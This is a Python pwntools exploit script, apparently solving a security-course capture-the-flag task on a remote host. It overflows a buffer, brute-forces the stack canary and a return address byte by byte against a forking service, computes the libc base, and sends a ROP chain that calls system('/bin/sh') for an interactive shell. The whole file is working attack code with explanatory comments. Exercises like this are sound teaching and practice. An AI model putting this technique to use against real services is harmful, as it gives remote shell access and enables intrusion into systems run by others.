#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33387)
#conn = pwn.process([exe.path])

# by default gdb will follow parent process after fork, we want to follow the child for debugging, so we set follow-fork-mode to child
# we create a breakpoint at (each) fork() with catch fork

#pwn.gdb.attach(conn, gdbscript="""
#set detach-on-fork off
#set follow-fork-mode child      
#catch fork
#""")

# GET CANARY
canary = []

for _ in range(8):
    canary.append(b'\x00')
    for guessed_byte in range(0,256):

        # send 1 sothat we start mining
        conn.recvuntil(b'Leave\n')
        conn.sendline(b'1')

        # now we can write 256 bytes, which will overflow the buffer and override Canary and return address...
        conn.recvuntil(b'What do you want to mine?')

        # we guess canary byte
        canary[-1] = guessed_byte.to_bytes(1, byteorder='little')
        payload = b'A'*24 + b''.join(canary)
        conn.send(payload)

        # check if we guessed correct
        response = conn.recvuntil([b'Sadly, the mine caved in :(', b'You made it back alive :)\n'])
        if b'You made it back alive :)\n' in response:
            # we guessed byte correctly go to next position
            break

# Nice to know: first byte of canary is a Null byte => sothat one cannot leak it via print 
canary = b''.join(canary)
print(f'canary = {canary}')


# GET ASLR the same way
return_address = []

for _ in range(8):
    return_address.append(b'\x00')
    for guessed_byte in range(0,256):

        # send 1 sothat we start mining
        conn.recvuntil(b'Leave\n')
        conn.sendline(b'1')

        # now we can write 256 bytes, which will overflow the buffer and override Canary and return address...
        conn.recvuntil(b'What do you want to mine?')

        # we guess byte
        return_address[-1] = guessed_byte.to_bytes(1, byteorder='little')
        payload = b'A'*24 + canary + b'B'*24 + b''.join(return_address)
        conn.send(payload)
        
        # sometimes it crashes apparently, timeout fixes it:
        response = conn.recvuntil([b'Sadly, the mine caved in :(', b'You made it back alive :)\n'], timeout=3)
        if b'You made it back alive :)\n' in response:
            # we guessed byte correctly go to next position
            break

return_address_little_endien = b''.join(return_address)
# unpack little endien 8 bytes to integer
return_address = pwn.u64(return_address_little_endien, endianness='little')
print(f'return_address = {hex(return_address)}')


# DEPLOY ROPCHAIN

# telescope <return_address> 20 shows where we jump to => subtract offset to get base
libc_base_address = return_address - (libc.symbols['__libc_start_main'] + 4 -0x80)

# set libc base address for automatic rop chain
libc.address = libc_base_address

# now we can build our rop chain.
rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

payload = payload = b'A'*24 + canary + b'B'*24 + rop.chain()

# send payload
conn.recvuntil(b'Leave\n')
conn.sendline(b'1')
conn.recvuntil(b'What do you want to mine?')
conn.send(payload)


conn.interactive()
